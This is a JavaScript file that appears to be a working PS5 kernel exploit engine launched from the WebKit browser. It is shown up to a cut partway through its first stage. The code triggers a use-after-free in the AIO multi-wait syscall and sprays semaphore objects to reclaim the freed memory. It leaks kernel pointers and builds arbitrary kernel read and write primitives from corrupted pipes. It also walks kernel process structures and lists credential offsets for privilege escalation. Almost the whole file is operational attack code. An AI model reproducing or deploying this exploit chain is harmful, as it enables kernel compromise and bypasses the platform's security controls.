function isKernelPtr(v) {
    return v !== null && v !== undefined && v.hi >>> 16 === 0xffff;
}
function isZero64(v) {
    return v !== null && v.low === 0 && v.hi === 0;
}
function isAligned8(v) {
    return v !== null && (v.low & 7) === 0;
}
function hx(v) {
    if (v === null || v === undefined) return "null";
    return "0x" + (v.hi >>> 0).toString(16) + (v.low >>> 0).toString(16).padStart(8, "0");
}
function w16(u8, off, v) { u8[off] = v & 0xff; u8[off + 1] = (v >>> 8) & 0xff; }
function w32(u8, off, v) { u8[off] = v & 0xff; u8[off + 1] = (v >>> 8) & 0xff; u8[off + 2] = (v >>> 16) & 0xff; u8[off + 3] = (v >>> 24) & 0xff; }
function w64(u8, off, v) {
    if (typeof v === "object" && v !== null && "low" in v) {
        w32(u8, off, v.low); w32(u8, off + 4, v.hi);
    } else {
        w32(u8, off, v >>> 0); w32(u8, off + 4, 0);
    }
}
function r16(u8, off) { return u8[off] | (u8[off + 1] << 8); }
function r32(u8, off) { return u8[off] | (u8[off + 1] << 8) | (u8[off + 2] << 16) | (u8[off + 3] << 24); }
let _i64Ctor = null;
function r64(u8, off) {
    const lo = (u8[off] | (u8[off + 1] << 8) | (u8[off + 2] << 16) | (u8[off + 3] << 24)) >>> 0;
    const hi = (u8[off + 4] | (u8[off + 5] << 8) | (u8[off + 6] << 16) | (u8[off + 7] << 24)) >>> 0;
    if (_i64Ctor) return _i64Ctor(lo, hi);
    if (typeof globalThis.int64 === "function") return new globalThis.int64(lo, hi);
    return { low: lo, hi: hi,
        add32(n) { const s = (lo + n) >>> 0; return r64maker(s, hi + (s < lo ? 1 : 0)); },
        toString() { return (hi >>> 0).toString(16) + (lo >>> 0).toString(16).padStart(8, "0"); }
    };
}
function r64maker(lo, hi) {
    return { low: lo >>> 0, hi: hi >>> 0,
        add32(n) { const s = ((lo >>> 0) + n) >>> 0; return r64maker(s, (hi >>> 0) + (s < (lo >>> 0) ? 1 : 0)); },
        toString() { return (hi >>> 0).toString(16) + (lo >>> 0).toString(16).padStart(8, "0"); }
    };
}

const SYS_AIO_INIT        = 0x29E;
const SYS_AIO_CREATE       = 0x29C;
const SYS_AIO_SUBMIT       = 0x295;
const SYS_AIO_MULTI_WAIT   = 0x297;
const SYS_AIO_MULTI_DELETE = 0x296;
const SYS_AIO_MULTI_POLL   = 0x298;
const SYS_AIO_GET_DATA     = 0x299;
const SYS_AIO_MULTI_CANCEL = 0x29A;
const SYS_AIO_SUBMIT_CMD   = 0x29D;
const SYS_AIO_MLOCK        = 0x2B0;

const SYS_OSEM_CREATE  = 0x225;
const SYS_OSEM_DELETE   = 0x226;
const SYS_OSEM_OPEN     = 0x227;
const SYS_OSEM_CLOSE    = 0x228;
const SYS_OSEM_WAIT     = 0x229;
const SYS_OSEM_TRYWAIT  = 0x22A;
const SYS_OSEM_POST     = 0x22B;
const SYS_OSEM_CANCEL   = 0x22C;

const SYS_GET_AIO_DEBUG_REQ_INFO = 0x2D7;

const SYS_PIPE2          = 0x2AF;
const SYS_READ           = 0x003;
const SYS_WRITE          = 0x004;
const SYS_CLOSE          = 0x006;
const SYS_GETPID         = 0x014;
const SYS_SOCKET         = 0x061;
const SYS_SETSOCKOPT     = 0x069;
const SYS_GETSOCKOPT     = 0x076;
const SYS_MMAP           = 0x1DD;
const SYS_MUNMAP         = 0x049;
const SYS_NANOSLEEP      = 0x0F0;
const SYS_SCHED_YIELD    = 0x14B;
const SYS_KQUEUE         = 0x16A;
const SYS_FCNTL          = 0x05C;
const SYS_IOCTL          = 0x036;
const SYS_GETUID         = 0x018;
const SYS_SETUID         = 0x017;
const SYS_DUP            = 0x029;

const WAITER_NODE_SIZE  = 0x38;
const WAITER_OWNER_OFF  = 0x18;
const OSEM_OBJ_ALLOC    = 0x60;
const OSEM_FLAG_OFF     = 0x45;
const OSEM_REFCOUNT_OFF = 0x54;
const UMA_ZONE_128      = 128;

const AIO_MULTI_WAIT_MODE_0 = 0;
const AIO_MULTI_WAIT_MODE_1 = 1;
const AIO_MULTI_WAIT_MODE_2 = 2;

const OSEM_SPRAY_COUNT     = 256;
const OSEM_SPRAY_BATCH     = 64;
const LEAK_ATTEMPTS        = 16;
const UAF_RETRY_MAX        = 32;
const RECLAIM_SPRAY_COUNT  = 512;
const KREAD_RETRIES        = 3;
const PROC_WALK_MAX        = 512;

const PIPE_PAGE_SIZE = 0x4000;
const PIPEBUF_SIZE   = 0x18;

const OFF = {
    PROC_PID:              0xBC,
    PROC_UCRED:            0x40,
    PROC_FD:               0x48,
    PROC_DYNLIB:           0x3E8,
    FILEDESC_OFILES:       0x00,
    FDESCENTTBL_HDR:       0x08,
    FILEDESCENT_SIZE:      0x30,
    FILE_F_DATA:           0x00,
    FILE_F_COUNT:          0x24,
    SOCKET_SO_PCB:         0x18,
    INPCB_PKTOPTS:         0x120,
    IP6PO_RTHDR:           0x70,
    PIPE_SIGIO:            0xD0,
    SIGIO_PROC:            0x00,
    FD_CDIR:               0x18,
    FD_RDIR:               0x10,
    FD_JDIR:               0x20,
    UCRED_CR_UID:          0x04,
    UCRED_CR_RUID:         0x08,
    UCRED_CR_SVUID:        0x0C,
    UCRED_CR_NGROUPS:      0x10,
    UCRED_CR_RGID:         0x14,
    UCRED_CR_SVGID:        0x18,
    UCRED_CR_SCEAUTHID:    0x58,
    UCRED_CR_SCECAPS0:     0x60,
    UCRED_CR_SCECAPS1:     0x68,
    UCRED_ATTRS_QWORD:     0x50,
    DYNLIB_SC_START:       0x308,
    DYNLIB_SC_END:         0x310,
};

const F_SETOWN = 6;
const FIOSETOWN = 0x80047302;

export function makeBagagwaEngine(X) {
    const {
        P, chain, i64, sys, runChain, mem, sleep, note,
        track, untrack, state, driver, flushMark, queueEvent,
    } = X;

    _i64Ctor = i64;

    const S = {
        aioInited:       false,
        aioRequests:     [],
        uafTriggered:    false,
        uafRequestIdx:   -1,
        osemHandles:     [],
        osemSprayIds:    [],
        leakedAddrs:     [],
        targetOsemAddr:  null,
        targetOsemIdx:   -1,

        aioRfd: -1, aioWfd: -1,
        masterRfd: -1, masterWfd: -1,
        victimRfd: -1, victimWfd: -1,
        masterFp: null, victimFp: null,
        masterPipeData: null, victimPipeData: null,
        fdOfiles: null,
        curproc: null, allproc: null,

        kernelWrites: 0,
        jailbroken: false,
        aliasesRepaired: false,
    };

    function alloc(size, label) {
        const dwords = Math.ceil(size / 4);
        const ptr = P.malloc(dwords, 1);
        let u8;
        if (ptr.backing) {
            u8 = new Uint8Array(ptr.backing.buffer, ptr.backing.byteOffset, dwords * 4);
        } else {
            u8 = new Uint8Array(dwords * 4);
        }
        // NOTE: backing is already pinned in P.nogc by P.malloc — do NOT
        // push the u8 view too (was doubling nogc growth -> JSC OOM
        // right after PAIR-RELEASE/settle on tight arenas).
        return { base: ptr, u8, bytes: size, label };
    }

    // OOM-resilient alloc: P.malloc (new Uint8Array in main.js) throws
    // "out of free memory" when the arena left by carrier release/settle
    // is tight. Never throws — GC-and-retry once, else null so callers
    // return a clean `why` instead of killing the page.
    function safeAlloc(size, label) {
        try {
            return alloc(size, label);
        } catch (e) {
            try { note("[alloc] P.malloc OOM for '" + label + "' (" + size + "B): " + (e && e.message ? e.message : e)); } catch (_) {}
            try { if (typeof globalThis.gc === "function") globalThis.gc(); } catch (_) {}
            try {
                const retry = alloc(size, label);
                try { note("[alloc] retry after gc OK: '" + label + "'"); } catch (_) {}
                return retry;
            } catch (e2) {
                try { note("[alloc] arena exhausted, no reclaim possible for '" + label + "'"); } catch (_) {}
                return null;
            }
        }
    }

    async function submitAioRequest(fd, buf, size, offset) {
        const idx = S.aioRequests.length;
        const reqBuf = safeAlloc(0x40, "aio-req-" + idx);
        if (!reqBuf) return { ok: false, why: "aio request buffer OOM (arena exhausted)" };
        w32(reqBuf.u8, 0x00, fd);
        w64(reqBuf.u8, 0x08, buf);
        w64(reqBuf.u8, 0x10, i64(size, 0));
        w64(reqBuf.u8, 0x18, offset || i64(0, 0));
        w32(reqBuf.u8, 0x20, 0);

        note("[SUBMIT-" + idx + "] fd=" + fd + " sz=" + size);

        // ── FIX 13.60: aio_submit arg order + ptr-to-ptr array ─────────────────
        // PS5 sys_aio_submit signature: (SceAioRequest *reqs[], uint32_t n_reqs)
        // The original code passed (count, direct_struct_ptr) which is wrong order
        // AND passed the struct directly instead of through a pointer array.
        // Build a 1-element pointer array: ptrArr[0] = &reqBuf
        const reqPtrBuf = safeAlloc(8, "aio-req-ptr-" + idx);
        if (!reqPtrBuf) return { ok: false, why: "aio req-ptr buffer OOM (arena exhausted)" };
        w64(reqPtrBuf.u8, 0, reqBuf.base);

        // Upstream v12/HEAD: (count, ptr) first — (ptr, count) OOMs
        // because a pointer in the count slot means a huge kernel alloc.
        // Each attempt try/caught so a hung layout falls through.
        let r = null;
        try {
            r = await sys(SYS_AIO_SUBMIT, 1, reqPtrBuf.base);
            note("[SUBMIT-" + idx + "] (count, ptr_arr) ret=" + r.s32 + " err=" + r.errText);
        } catch (e) {
            note("[SUBMIT-" + idx + "] (count, ptr_arr) threw: " + (e && e.message ? e.message : e));
        }
        if (!r || r.failed) {
            try {
                note("[SUBMIT-" + idx + "] retry (ptr_arr, count)");
                r = await sys(SYS_AIO_SUBMIT, reqPtrBuf.base, 1);
                note("[SUBMIT-" + idx + "] ptr-arr ret=" + r.s32 + " err=" + r.errText);
            } catch (e) {
                note("[SUBMIT-" + idx + "] (ptr_arr, count) threw: " + (e && e.message ? e.message : e));
            }
        }
        if (!r || r.failed) {
            // Last resort: original direct struct ptr (pre-13.x path)
            try {
                note("[SUBMIT-" + idx + "] retry (count, direct_struct)");
                r = await sys(SYS_AIO_SUBMIT, 1, reqBuf.base);
                note("[SUBMIT-" + idx + "] direct ret=" + r.s32 + " err=" + r.errText);
            } catch (e) {
                note("[SUBMIT-" + idx + "] direct threw: " + (e && e.message ? e.message : e));
            }
        }
        // ── END FIX ────────────────────────────────────────────────────────────

        if (!r || r.failed) return { ok: false, why: "aio_submit: " + (r ? r.errText : "all layouts hung") };
        S.aioRequests.push({ id: r.s32, buf: reqBuf });
        return { ok: true, reqId: r.s32 };
    }

    async function triggerUaf(num) {
        if (S.aioRequests.length < num)
            return { ok: false, why: "need " + num + " reqs, have " +
                S.aioRequests.length };

        const reqIdBuf = safeAlloc(num * 4, "aio-wait-ids");
        if (!reqIdBuf) return { ok: false, why: "multi-wait id buffer OOM (arena exhausted)" };
        for (let i = 0; i < num; i++) {
            w32(reqIdBuf.u8, i * 4, S.aioRequests[i].id);
            note("[UAF] slot " + i + " reqId=" + S.aioRequests[i].id);
        }

        // Upstream 5a1f212: PS5 aio_multi_wait = (ids, num, timeout_ptr, mode).
        // timeout=NULL(0) = wait forever -> with pending reads on an empty
        // pipe it blocks indefinitely -> worker never returns -> system OOM.
        // Pass a 100ns timespec so it returns via timeout -> cleanup -> UAF.
        const tsBuf = safeAlloc(16, "aio-mw-timeout");
        if (!tsBuf) return { ok: false, why: "multi-wait timeout buffer OOM (arena exhausted)" };
        w64(tsBuf.u8, 0, i64(0, 0));
        w64(tsBuf.u8, 8, i64(100, 0));
        note("[UAF] aio_multi_wait(ids," + num + ",timeout=100ns,mode=0)");
        note("[UAF] writeup sec.2: PS4=3args, PS5 adds mode → 4 args");
        const r = await sys(SYS_AIO_MULTI_WAIT,
            reqIdBuf.base, num, tsBuf.base, AIO_MULTI_WAIT_MODE_0);
        note("[UAF] ret=" + r.s32 + " err=" + r.errText +
            " hex=" + r.hex);

        if (!r.failed) {
            S.uafTriggered = true;
            S.uafRequestIdx = 0;
        }
        return { ok: !r.failed, ret: r.s32 };
    }

    // Upstream v10-style safe layout probe (dummy data only, never fails
    // the stage): EPERM/EINVAL/ESRCH = reachable layout, ENOMEM = pointer
    // in count slot (huge alloc), hang = blocking layout. The errno map
    // tells us the true 13.60 signature empirically.
    async function probeAioLayouts() {
        note("[PROBE] arg-layout probe (dummy data, safe)...");
        // Sanity first: pipe2 takes a pointer arg and is known-safe. If
        // THIS kills the tab, pointer-arg syscalls are broken in general
        // (not AIO-specific). If it passes, only AIO kills.
        const pb = safeAlloc(8, "probe-pipe");
        if (!pb) { note("[PROBE] skipped (OOM)"); return; }
        w32(pb.u8, 0, 0); w32(pb.u8, 4, 0);
        try {
            note("[PROBE] trying pipe2(ptr,0)...");
            const pr = await sys(SYS_PIPE2, pb.base, 0);
            note("[PROBE] pipe2 -> ret=" + pr.s32 + " err=" + pr.errText);
            if (!pr.failed) {
                const a = r32(pb.u8, 0) | 0, b = r32(pb.u8, 4) | 0;
                await sys(SYS_CLOSE, a); await sys(SYS_CLOSE, b);
                note("[PROBE] pipe2 fds closed — pointer-arg syscalls WORK");
            }
        } catch (e) {
            note("[PROBE] pipe2 threw: " + (e && e.message ? e.message : e));
        }
        const zs = safeAlloc(0x40, "probe-zero-struct");
        const ids = safeAlloc(8, "probe-dummy-ids");
        if (!zs || !ids) { note("[PROBE] AIO cases skipped (OOM)"); return; }
        for (let i = 0; i < 0x40; i++) zs.u8[i] = 0;
        w32(ids.u8, 0, 0); w32(ids.u8, 4, 1);
        // wait-cases first: submit is already proven lethal on 13.60
        // WebKit, so ask multi_wait (the UAF syscall itself) before dying.
        const cases = [
            ["wait(ids,2,0,0)", SYS_AIO_MULTI_WAIT, [ids.base, 2, 0, 0]],
            ["wait(0,ids,2,0)", SYS_AIO_MULTI_WAIT, [0, ids.base, 2, 0]],
            ["submit(1,ptr)", SYS_AIO_SUBMIT, [1, zs.base]],
            ["submit(ptr,1)", SYS_AIO_SUBMIT, [zs.base, 1]],
        ];
        for (const [label, num, args] of cases) {
            if (P.syscalls[num] === undefined) { note("[PROBE] " + label + ": no stub"); continue; }
            try {
                note("[PROBE] trying " + label + "...");
                const r = await sys.apply(null, [num].concat(args));
                note("[PROBE] " + label + " -> ret=" + r.s32 + " err=" + r.errText);
            } catch (e) {
                note("[PROBE] " + label + " threw: " + (e && e.message ? e.message : e));
            }
        }
        note("[PROBE] done — EPERM/EINVAL=safe layout, ENOMEM=pointer-as-count, hang=blocking");
    }

    async function sprayOsem(count, batchSize) {
        const n = count || OSEM_SPRAY_COUNT;
        const batch = batchSize || OSEM_SPRAY_BATCH;
        const handles = [];
        let created = 0;

        const nameBuf = safeAlloc(32, "osem-name");
        const attrBuf = safeAlloc(0x20, "osem-attr");
        if (!nameBuf || !attrBuf) return { ok: false, count: 0, handles: [], why: "osem name/attr OOM (arena exhausted)" };
        w32(attrBuf.u8, 0x00, 1);
        w32(attrBuf.u8, 0x04, 0);
        w32(attrBuf.u8, 0x08, 1);

        for (let base = 0; base < n; base += batch) {
            const nb = Math.min(batch, n - base);
            for (let i = 0; i < nb; i++) {
                const nameStr = "bgw_" + (base + i);
                for (let c = 0; c < nameStr.length; c++)
                    nameBuf.u8[c] = nameStr.charCodeAt(c);
                nameBuf.u8[nameStr.length] = 0;

                const r = await sys(SYS_OSEM_CREATE, nameBuf.base, attrBuf.base);
                if (r.failed) {
                    note("osem_create failed at index " + (base + i) + ": " + r.errText);
                    break;
                }
                handles.push(r.s32);
                created++;
            }
            if (created < base + nb) break;
        }

        S.osemHandles = S.osemHandles.concat(handles);
        S.osemSprayIds = handles.slice();

        flushMark("BAGAGWA-OSEM-SPRAY", "created=" + created + "-target=" + n);
        note("sprayed " + created + " osem objects into 128-byte UMA zone");
        return { ok: created > 0, count: created, handles };
    }

    async function leakViaDebugInfo(reqId, tableIdx) {
        if (P.syscalls[SYS_GET_AIO_DEBUG_REQ_INFO] === undefined) {
            return { ok: false, why: "syscall 727 (0x2D7) stub not in firmware profile" };
        }

        const outBuf = safeAlloc(0x100, "aio-debug-leak");
        if (!outBuf) return { ok: false, why: "debug-leak buffer OOM (arena exhausted)" };
        for (let i = 0; i < 0x100; i++) outBuf.u8[i] = 0;

        const composedId = ((tableIdx & 0x7F) << 16) | (reqId & 0xFFFF);

        const r = await sys(SYS_GET_AIO_DEBUG_REQ_INFO, composedId, outBuf.base, 0x100);
        if (r.failed) return { ok: false, why: "get_aio_debug_request_info failed: " + r.errText };

        const leaked = [];
        for (let off = 0; off + 8 <= 0x100; off += 8) {
            const v = r64(outBuf.u8, off);
            if (isKernelPtr(v)) {
                leaked.push({ offset: off, value: v });
            }
        }

        for (let off = 0; off + 4 <= 0x100; off += 4) {
            const dw = r32(outBuf.u8, off) >>> 0;
            if (dw !== 0 && (dw & 0xFFFF0000) !== 0) {
                const existing = leaked.find(l => l.offset === (off & ~7));
                if (!existing) {
                    leaked.push({ offset: off, dword: dw });
                }
            }
        }

        S.leakedAddrs = S.leakedAddrs.concat(leaked);
        flushMark("BAGAGWA-LEAK", "composedId=0x" + composedId.toString(16) +
            "-leaked=" + leaked.length + "-ptrs");
        return { ok: leaked.length > 0, leaked };
    }

    async function triggerWaker(requestIdx) {
        const idx = requestIdx !== undefined ? requestIdx : S.uafRequestIdx;
        if (idx < 0 || idx >= S.aioRequests.length)
            return { ok: false, why: "invalid request index " + idx };
        if (S.aioWfd < 0)
            return { ok: false, why: "AIO write-end pipe not available" };

        const req = S.aioRequests[idx];

        const pipeBuf = safeAlloc(64, "waker-pipe-data");
        if (!pipeBuf) return { ok: false, why: "waker pipe buffer OOM (arena exhausted)" };
        for (let i = 0; i < 64; i++) pipeBuf.u8[i] = 0x41;
        const wr = await sys(SYS_WRITE, S.aioWfd, pipeBuf.base, 64);

        flushMark("BAGAGWA-WAKER-TRIGGER", "reqIdx=" + idx +
            "-reqId=" + req.id + "-aioWfd=" + S.aioWfd + "-writeRet=" + wr.s32);

        await sleep(100);

        return { ok: !wr.failed, writeRet: wr.s32 };
    }

    async function manipulateOsemRefcount(targetHandle, decrements) {
        const n = decrements || 1;
        for (let i = 0; i < n; i++) {
            const r = await sys(SYS_OSEM_CLOSE, targetHandle);
            if (r.failed) {
                return { ok: false, why: "osem_close failed at decrement " + i + ": " + r.errText, decremented: i };
            }
        }
        return { ok: true, decremented: n };
    }

    async function setupPipes() {
        const buf = safeAlloc(8, "pipe-fds");
        if (!buf) return { ok: false, why: "pipe-fds buffer OOM (arena exhausted)" };

        w32(buf.u8, 0, 0); w32(buf.u8, 4, 0);
        let r = await sys(SYS_PIPE2, buf.base, 0);
        if (r.failed) return { ok: false, why: "pipe2 (master) failed: " + r.errText };
        S.masterRfd = r32(buf.u8, 0) | 0;
        S.masterWfd = r32(buf.u8, 4) | 0;
        track(S.masterRfd); track(S.masterWfd);

        w32(buf.u8, 0, 0); w32(buf.u8, 4, 0);
        r = await sys(SYS_PIPE2, buf.base, 0);
        if (r.failed) return { ok: false, why: "pipe2 (victim) failed: " + r.errText };
        S.victimRfd = r32(buf.u8, 0) | 0;
        S.victimWfd = r32(buf.u8, 4) | 0;
        track(S.victimRfd); track(S.victimWfd);

        const seedBuf = safeAlloc(1, "pipe-seed");
        if (!seedBuf) return { ok: false, why: "pipe-seed buffer OOM (arena exhausted)" };
        seedBuf.u8[0] = 0x41;
        await sys(SYS_WRITE, S.masterWfd, seedBuf.base, 1);
        await sys(SYS_WRITE, S.victimWfd, seedBuf.base, 1);

        note("pipes: master r=" + S.masterRfd + " w=" + S.masterWfd +
             ", victim r=" + S.victimRfd + " w=" + S.victimWfd);
        return { ok: true };
    }

    async function kreadFast(src, destBuf, n) {
        if (!S.masterPipeData || !S.victimPipeData) return -1;
        const pb = safeAlloc(PIPEBUF_SIZE, "kread-pipebuf");
        if (!pb) return -1;
        w32(pb.u8, 0x00, n);
        w32(pb.u8, 0x04, 0);
        w32(pb.u8, 0x08, 0);
        w32(pb.u8, 0x0c, PIPE_PAGE_SIZE);
        w64(pb.u8, 0x10, src);

        await sys(SYS_WRITE, S.masterWfd, pb.base, PIPEBUF_SIZE);
        await sys(SYS_READ, S.masterRfd, pb.base, PIPEBUF_SIZE);

        const r = await sys(SYS_READ, S.victimRfd, destBuf.base, n);
        return r.failed ? -1 : r.s32;
    }

    async function kwriteFast(dest, srcBuf, n) {
        if (!S.masterPipeData || !S.victimPipeData) return -1;
        const pb = safeAlloc(PIPEBUF_SIZE, "kwrite-pipebuf");
        if (!pb) return -1;
        w32(pb.u8, 0x00, 0);
        w32(pb.u8, 0x04, 0);
        w32(pb.u8, 0x08, 0);
        w32(pb.u8, 0x0c, PIPE_PAGE_SIZE);
        w64(pb.u8, 0x10, dest);

        await sys(SYS_WRITE, S.masterWfd, pb.base, PIPEBUF_SIZE);
        await sys(SYS_READ, S.masterRfd, pb.base, PIPEBUF_SIZE);

        const r = await sys(SYS_WRITE, S.victimWfd, srcBuf.base, n);
        S.kernelWrites++;
        return r.failed ? -1 : r.s32;
    }

    async function kread64Fast(addr) {
        const buf = safeAlloc(8, "kr64");
        if (!buf) return { ret: -1, v: i64(0, 0) };
        for (let i = 0; i < 8; i++) buf.u8[i] = 0xEE;
        const ret = await kreadFast(addr, buf, 8);
        return { ret, v: r64(buf.u8, 0) };
    }

    async function kread32Fast(addr) {
        const buf = safeAlloc(4, "kr32");
        if (!buf) return { ret: -1, v: 0 };
        for (let i = 0; i < 4; i++) buf.u8[i] = 0xEE;
        const ret = await kreadFast(addr, buf, 4);
        return { ret, v: r32(buf.u8, 0) >>> 0 };
    }

    async function kwrite64Fast(addr, v) {
        const buf = safeAlloc(8, "kw64");
        if (!buf) return -1;
        w64(buf.u8, 0, v);
        return await kwriteFast(addr, buf, 8);
    }

    async function kwrite32Fast(addr, v) {
        const buf = safeAlloc(4, "kw32");
        if (!buf) return -1;
        w32(buf.u8, 0, v >>> 0);
        return await kwriteFast(addr, buf, 4);
    }

    async function fgetFast(fd) {
        if (!S.fdOfiles) return { ret: -1, v: i64(0, 0) };
        return await kread64Fast(S.fdOfiles.add32(fd * OFF.FILEDESCENT_SIZE));
    }

    async function findCurproc() {
        const pidR = await sys(SYS_GETPID);
        if (pidR.failed || pidR.s32 <= 0)
            return { ok: false, why: "getpid failed: " + pidR.errText };
        const pid = pidR.s32;

        const pipeBuf = safeAlloc(8, "sigio-pipe");
        if (!pipeBuf) return { ok: false, why: "sigio-pipe buffer OOM (arena exhausted)" };
        w32(pipeBuf.u8, 0, 0); w32(pipeBuf.u8, 4, 0);
        const pr = await sys(SYS_PIPE2, pipeBuf.base, 0);
        if (pr.failed) return { ok: false, why: "pipe2 failed: " + pr.errText };
        const rfd = r32(pipeBuf.u8, 0) | 0;
        const wfd = r32(pipeBuf.u8, 4) | 0;

        try {
            const ownBuf = safeAlloc(4, "sigio-own");
            if (!ownBuf) return { ok: false, why: "sigio-own buffer OOM (arena exhausted)" };
            w32(ownBuf.u8, 0, pid);
            let own = await sys(SYS_IOCTL, rfd, i64(FIOSETOWN, 0), ownBuf.base);
            if (own.failed) {
                own = await sys(SYS_FCNTL, rfd, F_SETOWN, pid);
            }
            if (own.failed) return { ok: false, why: "FIOSETOWN/F_SETOWN failed: " + own.errText };

            const fp = await fgetFast(rfd);
            if (!isKernelPtr(fp.v)) return { ok: false, why: "sigio fp " + hx(fp.v) };
            const fdata = await kread64Fast(fp.v.add32(OFF.FILE_F_DATA));
            if (!isKernelPtr(fdata.v)) return { ok: false, why: "f_data " + hx(fdata.v) };
            const sigio = await kread64Fast(fdata.v.add32(OFF.PIPE_SIGIO));
            if (!isKernelPtr(sigio.v)) return { ok: false, why: "pipe_sigio " + hx(sigio.v) };
            const proc = await kread64Fast(sigio.v.add32(OFF.SIGIO_PROC));
            if (!isKernelPtr(proc.v)) return { ok: false, why: "curproc " + hx(proc.v) };
            return { ok: true, curproc: proc.v, pid };
        } finally {
            await sys(SYS_CLOSE, wfd);
            await sys(SYS_CLOSE, rfd);
        }
    }

    async function findProcByPid(startProc, linkOff, wantPid) {
        let p = startProc;
        for (let i = 0; i < PROC_WALK_MAX; i++) {
            if (isZero64(p) || !isKernelPtr(p)) return null;
            const pid = await kread32Fast(p.add32(OFF.PROC_PID));
            if (pid.ret === 4 && pid.v === wantPid) return p;
            const nxt = await kread64Fast(p.add32(linkOff));
            if (nxt.ret !== 8) return null;
            p = nxt.v;
        }
        return null;
    }

    async function findAllproc() {
        if (S.allproc) return { ok: true, addr: S.allproc };
        if (!S.curproc) return { ok: false, why: "need curproc first" };
        let p = S.curproc;
        for (let i = 0; i < PROC_WALK_MAX; i++) {
            if (!isKernelPtr(p)) return { ok: false, why: "not canonical at hop " + i };
            if (p.hi >>> 0 === 0xffffffff) {
                S.allproc = p;
                return { ok: true, addr: p, hops: i };
            }
            const nxt = await kread64Fast(p.add32(0x08));
            if (nxt.ret !== 8) return { ok: false, why: "unreadable at hop " + i };
            p = nxt.v;
        }
        return { ok: false, why: "exhausted walk" };
    }

    async function findRootvnode() {
        const ap = await findAllproc();
        if (!ap.ok) return { ok: false, why: "allproc: " + ap.why };
        const head = await kread64Fast(ap.addr);
        if (head.ret !== 8 || !isKernelPtr(head.v))
            return { ok: false, why: "*allproc = " + hx(head.v) };

        const KERNEL_PID = 0;
        const init = await findProcByPid(head.v, 0x00, KERNEL_PID);
        if (!init) return { ok: false, why: "kernel proc not found" };

        const initFd = await kread64Fast(init.add32(OFF.PROC_FD));
        if (initFd.ret !== 8 || !isKernelPtr(initFd.v))
            return { ok: false, why: "kernel p_fd = " + hx(initFd.v) };

        const rv = await kread64Fast(initFd.v.add32(OFF.FD_CDIR));
        if (rv.ret !== 8 || !isKernelPtr(rv.v))
            return { ok: false, why: "rootvnode = " + hx(rv.v) };
        return { ok: true, init, initFd: initFd.v, rootvnode: rv.v };
    }

    async function stage0_uaf(opts) {
        const o = opts || {};
        const out = { ok: false, why: "", steps: [] };

        note("=== Stage 0: aio_multi_wait mode 0 UAF ===");
        note("writeup sec.1: syscall 663 @ 0x805c0210");
        note("writeup sec.1: mode 0 @ 0x805c08e5 rcx=[rbx+0x40]");
        note("writeup sec.2: PS4=3args no mode, PS5 adds mode=4args");
        note("writeup sec.1: cleanup @ 0x805c0da1, free @ 0x805c0f93");

        const requiredStubs = [
            [SYS_PIPE2, "pipe2"],
            [SYS_AIO_SUBMIT, "aio_submit"],
            [SYS_AIO_MULTI_WAIT, "aio_multi_wait"],
        ];
        const missingStubs = requiredStubs.filter(([num]) =>
            P.syscalls[num] === undefined);
        if (missingStubs.length) {
            out.why = "missing Stage 0 stubs: " + missingStubs.map(([, name]) =>
                name).join(", ");
            return out;
        }
        note("[S0-0] stubs ready: pipe2/aio_submit/aio_multi_wait");

        // ── AIO CONTEXT INIT: 3-tier attempt ─────────────────────────────────
        // Tier 1: aio_init (0x29E) — global process AIO context. Blocked by WebKit
        //         sandbox on 13.60 (EPERM), but we try it and fall through.
        // Tier 2: aio_create (0x29C) — per-channel fd, avoids global init.
        //         Has separate sandbox check; may be allowed even if aio_init isn't.
        // Tier 3: proceed without init (hope aio_submit has correct args now).
        note("[S0-0a] Tier 1: aio_init (0x" + SYS_AIO_INIT.toString(16) + ")...");
        let aioInitBlocked = false;
        if (P.syscalls[SYS_AIO_INIT] !== undefined) {
            // ZERO-ALLOC probe first: sandbox (EPERM) / arg checks happen
            // before the kernel touches the params pointer, so pass NULL.
            // This is the FIRST kernel-stage alloc after carrier
            // release/settle — P.malloc can OOM here ("out of free memory").
            // Only build the 0x10 struct if the null call proves the
            // syscall is reachable but wants a real pointer (EINVAL).
            const initR0 = await sys(SYS_AIO_INIT, 0);
            note("[S0-0a] aio_init(0) ret=" + initR0.s32 + " err=" + initR0.errText);
            if (!initR0.failed) {
                S.aioInited = true;
                note("[S0-0a] AIO initialized via aio_init(0) — no params needed");
            } else if (initR0.errText !== "EPERM" && initR0.errText !== "ENOSYS") {
                note("[S0-0a] reachable, retrying once with params struct");
                const initBuf = safeAlloc(0x10, "aio-init-params");
                if (initBuf) {
                    w32(initBuf.u8, 0x00, 0x10); // struct size
                    w32(initBuf.u8, 0x04, 32);   // max requests
                    w32(initBuf.u8, 0x08, 0);
                    w32(initBuf.u8, 0x0c, 0);
                    const initR = await sys(SYS_AIO_INIT, initBuf.base);
                    note("[S0-0a] aio_init(params) ret=" + initR.s32 + " err=" + initR.errText);
                    if (!initR.failed) {
                        S.aioInited = true;
                        note("[S0-0a] AIO initialized via aio_init OK");
                    } else {
                        aioInitBlocked = true;
                        note("[S0-0a] aio_init blocked: " + initR.errText);
                    }
                } else {
                    aioInitBlocked = true;
                    note("[S0-0a] params alloc OOM — treating as blocked, fall through to aio_create (no alloc used)");
                }
            } else {
                aioInitBlocked = true;
                note("[S0-0a] aio_init " + initR0.errText + " — WebKit sandbox blocks global AIO init, fall through (no alloc used)");
            }
        } else {
            note("[S0-0a] aio_init not in stub table — older FW path, skipping");
        }

        // Tier 2: SKIPPED per upstream OzRviju/bagagwa-exploit v8/v12:
        // aio_create/aio_init are not in the writeup (only aio_submit 0x295
        // + aio_multi_wait 0x297) and aio_create caused the OOM crash on
        // PS5 (FW 11.40+). v12: pointer-as-arg1 is read as count -> huge
        // kernel alloc -> OOM. Do NOT call 0x29C from WebKit.
        if (!S.aioInited) {
            note("[S0-0b] Tier 2 SKIPPED: aio_create not in writeup, OOMs (upstream v8) — going straight to pipe/submit");
            // Chain health check only (zero-alloc): proves the worker is
            // alive after the trim without touching 0x29C.
            try { note("[S0-0b] trimming heap before pipe stage (gc+settle)..."); } catch (_) {}
            try { if (typeof globalThis.gc === "function") globalThis.gc(); } catch (_) {}
            try { await sleep(600); } catch (_) {}
            try {
                const chk = await sys(SYS_GETPID);
                note("[S0-0b] chain re-check getpid()=" + chk.s32 + " err=" + chk.errText);
                if (chk.failed || chk.s32 <= 0) {
                    out.why = "chain died after trim (getpid failed: " + chk.errText + ") — heap/worker issue";
                    return out;
                }
            } catch (e) {
                note("[S0-0b] chain re-check threw: " + (e && e.message ? e.message : e));
                out.why = "chain hung after trim (getpid no-return) — heap/worker issue";
                return out;
            }
        }

